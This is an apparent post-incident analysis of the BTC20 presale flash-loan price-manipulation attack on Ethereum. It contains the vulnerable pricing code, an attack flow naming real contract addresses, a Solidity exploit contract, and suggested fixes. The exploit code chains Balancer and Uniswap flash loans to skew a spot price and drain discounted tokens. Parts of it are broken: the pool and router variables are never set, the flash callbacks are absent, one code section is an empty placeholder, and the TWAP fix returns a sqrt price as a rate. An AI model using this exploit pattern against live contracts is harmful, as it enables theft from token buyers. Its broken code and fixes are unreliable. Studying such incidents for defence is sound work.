# BTC20 Presale Price Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | BTC20 |
| Date | 2023-08-08 |
| Chain | Ethereum Mainnet |
| Loss | ~18 ETH |
| Attack Type | Flash Loan + Presale Price Manipulation |
| CWE | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |
| Attacker Address | `0x6ce9fa08f139f5e48bc607845e57efe9aa34c9f6` |
| Attack Contract | `0xb7fbf984a50cd7c66e6da3448d68d9f3b7f24f33` |
| Vulnerable Contract | `0x1F006F43f57C45Ceb3659E543352b4FAe4662dF7` (IPresaleV4) |
| Fork Block | 17,949,214 |

## 2. Vulnerability Code Analysis

BTC20's `PresaleV4` contract allowed users to purchase BTC20 with ETH via the `buyWithEthDynamic()` function. The price calculation in this function relied on the DEX spot price (SDEX/BTC20 pool ratio). The attacker obtained a large amount of ETH via a flash loan, manipulated the SDEX price through multiple Uniswap/Balancer pools, and used the manipulated price to purchase BTC20 at a heavily discounted rate through the presale.

```solidity
// Vulnerable pattern: presale price calculation based on DEX spot price
contract PresaleV4 {
    address public SDEX;
    address public BTC20;
    IUniswapV2Pair public sdexBtc20Pair;

    // Vulnerable: presale price determined by manipulable DEX spot price
    function getEthToBtc20Rate() public view returns (uint256) {
        (uint256 sdexReserve, uint256 btc20Reserve,) = sdexBtc20Pair.getReserves();
        // Direct use of spot price — manipulable
        uint256 sdexPerBtc20 = sdexReserve * 1e18 / btc20Reserve;
        return calculateEthRate(sdexPerBtc20);
    }

    // Vulnerable: dynamic purchase executed at manipulated price
    function buyWithEthDynamic() external payable {
        uint256 rate = getEthToBtc20Rate();
        uint256 btc20Amount = msg.value * rate / 1e18;
        BTC20Token.transfer(msg.sender, btc20Amount);
    }
}
```

**Vulnerability**: `buyWithEthDynamic()` determines the purchase price using the instantaneous ratio of the SDEX-BTC20 Uniswap V2/V3 pool. By injecting or removing large amounts of SDEX from the pool via a flash loan, this ratio can be manipulated, allowing a presale participant to acquire BTC20 at a price far more favorable than the market rate.

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Presale Price Manipulation
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0x6ce9fa08f139f5e48bc607845e57efe9aa34c9f6]
  │
  ├─1─▶ Balancer.flashLoan() call
  │      [Balancer Vault: 0xBA12222222228d8Ba445958a75a0704d566BF2C8]
  │      Borrow 300 ETH
  │
  ├─2─▶ SDEX_BTC20_Pair3.flash() chained flash loan
  │      [SDEX: 0x5DE8ab7E27f6E7A1fFf3E5B337584Aa43961BEeF]
  │      Acquire additional SDEX
  │
  ├─3─▶ BTC20_WETH_Pair3.flash()
  │      [BTC20: 0xE86DF1970055e9CaEe93Dae9B7D5fD71595d0e18]
  │      [WETH: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
  │      Manipulate SDEX-BTC20 pool ratio
  │
  ├─4─▶ PresaleV4.buyWithEthDynamic() call
  │      [PresaleV4: 0x1F006F43f57C45Ceb3659E543352b4FAe4662dF7]
  │      Bulk purchase of BTC20 at manipulated SDEX price
  │      → Significant discount applied vs. market price
  │
  ├─5─▶ uniRouter.swapTokensForExactTokens()
  │      BTC20 → WETH reverse swap
  │
  ├─6─▶ uniRouterV3.exactInputSingle()
  │      Clean up remaining tokens
  │
  └─7─▶ Repay all flash loans + realize ~18 ETH profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IPresaleV4 {
    function buyWithEthDynamic() external payable;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

contract BTC20Exploit {
    IPresaleV4 presale = IPresaleV4(0x1F006F43f57C45Ceb3659E543352b4FAe4662dF7);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 BTC20 = IERC20(0xE86DF1970055e9CaEe93Dae9B7D5fD71595d0e18);
    IERC20 SDEX = IERC20(0x5DE8ab7E27f6E7A1fFf3E5B337584Aa43961BEeF);
    Uni_Pair_V3 SDEX_BTC20_Pair3;
    Uni_Pair_V3 BTC20_WETH_Pair3;
    Uni_Router_V2 uniRouter = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    Uni_Router_V3 uniRouterV3;

    function testExploit() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 300 ether;

        // Borrow 300 ETH via Balancer flash loan
        balancer.flashLoan(address(this), tokens, amounts, "btc20");
    }

    function receiveFlashLoan(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external {
        // Manipulate SDEX pool ratio via chained flash loans
        SDEX_BTC20_Pair3.flash(address(this), 0, SDEX.balanceOf(address(SDEX_BTC20_Pair3)) * 9/10, "sdex");
        BTC20_WETH_Pair3.flash(address(this), 0, BTC20.balanceOf(address(BTC20_WETH_Pair3)) * 9/10, "btc20weth");

        // Participate in presale at manipulated SDEX price
        WETH.withdraw(50 ether);
        presale.buyWithEthDynamic{value: 50 ether}();

        // Sell BTC20
        uint256 btc20Balance = BTC20.balanceOf(address(this));
        BTC20.approve(address(uniRouter), btc20Balance);
        address[] memory path = new address[](2);
        path[0] = address(BTC20);
        path[1] = address(WETH);
        uniRouter.swapTokensForExactTokens(amounts[0] + feeAmounts[0], btc20Balance, path, address(this), block.timestamp);

        // Repay Balancer flash loan
        WETH.transfer(address(balancer), amounts[0] + feeAmounts[0]);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |
| Vulnerability Type | Presale spot price dependency, DEX oracle manipulation |
| Affected Scope | BTC20 PresaleV4 contract |
| Explorer | [Etherscan](https://etherscan.io/address/0x1F006F43f57C45Ceb3659E543352b4FAe4662dF7) |

## 6. Security Recommendations

```solidity
// Fix 1: Use a fixed price via Chainlink oracle
contract PresaleV4 {
    AggregatorV3Interface public ethUsdFeed =
        AggregatorV3Interface(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);

    function getEthToBtc20Rate() public view returns (uint256) {
        (, int256 ethUsdPrice,,,) = ethUsdFeed.latestRoundData();
        // Use Chainlink price instead of DEX spot price
        return uint256(ethUsdPrice) * btc20PerUsd / 1e8;
    }
}

// Fix 2: Use TWAP price
function getEthToBtc20Rate() public view returns (uint256) {
    // UniswapV3 TWAP (30-minute average)
    uint32[] memory secondsAgos = new uint32[](2);
    secondsAgos[0] = 1800;
    secondsAgos[1] = 0;
    (int56[] memory tickCumulatives,) = pool.observe(secondsAgos);
    int56 tickDelta = tickCumulatives[1] - tickCumulatives[0];
    int24 avgTick = int24(tickDelta / 1800);
    return TickMath.getSqrtRatioAtTick(avgTick);
}

// Fix 3: Fixed-price presale
uint256 public constant PRESALE_PRICE = 0.0001 ether; // fixed price

function buyWithEth() external payable {
    uint256 btc20Amount = msg.value / PRESALE_PRICE;
    BTC20Token.transfer(msg.sender, btc20Amount);
}
```

## 7. Lessons Learned

1. **Presale Price Oracle**: If a presale contract uses DEX spot prices as the purchase rate, the price can be immediately manipulated via a flash loan. An external oracle such as Chainlink or a fixed price should be used instead.
2. **Risks of Dynamic Presale Pricing**: A "dynamic" presale price is intended to reflect fair market value, but it carries a serious trade-off in that it is vulnerable to oracle manipulation.
3. **Multi-Pool Chained Attack**: The pattern of chaining manipulations across three pools — Balancer + Uniswap V2/V3 — can bypass single-pool defenses. Price data sources must be diversified.
4. **Pre-Presale Security Audit**: Presale contracts must undergo an external audit before launch. Recovery from losses after the presale concludes is virtually impossible.